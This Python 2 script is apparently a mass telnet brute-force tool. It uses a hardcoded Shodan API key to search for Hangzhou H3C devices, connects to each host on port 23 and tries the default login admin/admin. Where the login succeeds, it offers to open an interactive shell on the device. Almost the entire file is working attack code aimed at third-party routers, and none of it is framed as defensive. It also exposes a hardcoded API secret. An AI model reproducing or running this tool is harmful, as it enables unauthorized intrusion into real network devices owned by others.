import re, os, telnetlib, time, sys, socket, shodan, subprocess


# variaveis
empty = []
re1 = re.compile(r'%'); # fail login
re2 = re.compile(r' ')
file = 'result.csv' # file to save shodan results
access = 'access.csv' # garanted access
user = 'admin' # user to try
password = 'admin' # password to try
# end variaveis


# class for colors
class bcolors:
    HEADER = '\033[95m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
# end class

# class for banners
class banner:
	index = '''       __    __     ______     ______     ______               
      /\ "-./  \   /\  __ \   /\  ___\   /\  ___\              
      \ \ \-./\ \  \ \  __ \  \ \___  \  \ \___  \             
       \ \_\ \ \_\  \ \_\ \_\  \/\_____\  \/\_____\            
        \/_/  \/_/   \/_/\/_/   \/_____/   \/_____/            
 ______   ______     __         __   __     ______     ______  
/\__  _\ /\  ___\   /\ \       /\ "-.\ \   /\  ___\   /\__  _\ 
\/_/\ \/ \ \  __\   \ \ \____  \ \ \-.  \  \ \  __\   \/_/\ \/ 
   \ \_\  \ \_____\  \ \_____\  \ \_\\"\_\  \ \_____\    \ \_\ 
    \/_/   \/_____/   \/_____/   \/_/ \/_/   \/_____/     \/_/ 
                                                               
    					t1m3 [@digitalgangsta]
'''\
	
	autor = 't1m3 [@digitalgangsta] - Telegram'

	options = '''##############################################################
[1] Start crawling with Shodan API;
[2] Exit;
##############################################################
'''\

	separator = '''##############################################################'''\
# end class

# main funcition
def main():

	os.system("clear")

	print(bcolors.FAIL+banner.index+bcolors.ENDC)
	print(banner.options)

	option = raw_input('[1-2] > ')
	
	if option == '1':
		crack()
	elif option == '2':
		print('[-] Exiting...')
		time.slee(2)
		sys.exit()
	else:
		print('[-] '+bcolors.UNDERLINE+'Invadid option.'+bcolors.ENDC+'\n')
		main()
# end main

# shodan api + crawling
def crack():

	os.system("rm -f result.csv 2&>/dev/null") # remove olders results if exist

	model = 'Hangzhou H3C Tech'
	print('[*] Crawling %s ips...\n' % (model))
	
	try:

		key = 'EJV3A4Mka2wPs7P8VBCO6xcpRe27iNJu'
		api = shodan.Shodan(key) # conf api
		query = model+''.join(sys.argv[1:]) # format query
		result = api.search(query) # search var

		for service in result['matches']:
			ips = service['ip_str']	# format output
			os.system("echo - > results.csv") # new result file

			save = open(file, 'w') # save the result
			save.write(ips)
			save.close

			shodan_crack()

	except Exception as error:
		print('[-] Error: %s' % (error))
		time.sleep(2)
		sys.exit()
# end shodan

def shodan_crack():

	os.system('echo  > access.csv') # remove olders access if exist

	global line # set var line to call in any function

	with open(file) as f: # function to try line per line
		for line in f:
			try:
				print banner.separator
				print('[*] Trying connect to: %s ...' % (line))
				
				try:
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(1)
					s.connect((line, 23))
					s.close()
					
					print('['+bcolors.OKGREEN+'+'+bcolors.ENDC+'] Host: %s is online!' % (line))

					tn = telnetlib.Telnet(line, 23, 3) # Try to connect on ip in port 23 with 3 seconds for timeout
					
					print('[*] Reading banner on %s ...\n' % (line))

					time.sleep(1)

					if tn.read_until('Username:', 2):
						print('[*] Trying user '+bcolors.HEADER+'ADMIN'+bcolors.ENDC+'\n')
					
						try:
							tn.write(user+'\r')
							print('['+bcolors.OKGREEN+'+'+bcolors.ENDC+'] User ADMIN ['+bcolors.OKGREEN+'OK'+bcolors.ENDC+']\n')
							
							time.sleep(1)

							tn.read_until('Password:', 2)
							print('[*] Trying password...\n')
							
							tn.write(password+'\n')

							read = tn.read_some()

							if re1.search(read):
								print('['+bcolors.FAIL+'-'+bcolors.ENDC+'] Access - - - - - - - - - ['+bcolors.FAIL+'FAIL'+bcolors.ENDC+']\n')
								print banner.separator
								pass
							else:
								print('['+bcolors.OKGREEN+'+'+bcolors.ENDC+'] Access - - - - - - - - - ['+bcolors.OKGREEN+'GARANTED'+bcolors.ENDC+']')
								shell = read
								print('[*] Current login>\n %s\n' % (shell))
								time.sleep(1)
								print('[+] Do you want open a interactive shell?')
								shell1 = raw_input('[y/N] > ')
								if shell1 == 'y':
									os.system("echo %s > host.csv" % line)
									os.system("xterm -e python remote.py")
								else:
									print('[OK] Trying next target...')
									time.sleep(2)
									pass

								print banner.separator

						except:
							print('['+bcolors.FAIL+'-'+bcolors.ENDC+'] Admin access - - - - - - - - - ['+bcolors.FAIL+'FAIL'+bcolors.ENDC+']\n')
							print banner.separator
							pass
				except:
					print('['+bcolors.FAIL+'-'+bcolors.ENDC+'] Host: %s is offline or port 23 is closed!\n' % (line))
					print banner.separator
					pass
			except:
				print('['+bcolors.FAIL+'-'+bcolors.ENDC+'] ERROR!\n')
				print banner.separator
				time.sleep(2)
				sys.exit()

if __name__ == '__main__':
	try:
		main()
	except:
		print('[*] Exiting...')
		time.sleep(2)
		sys.exit()
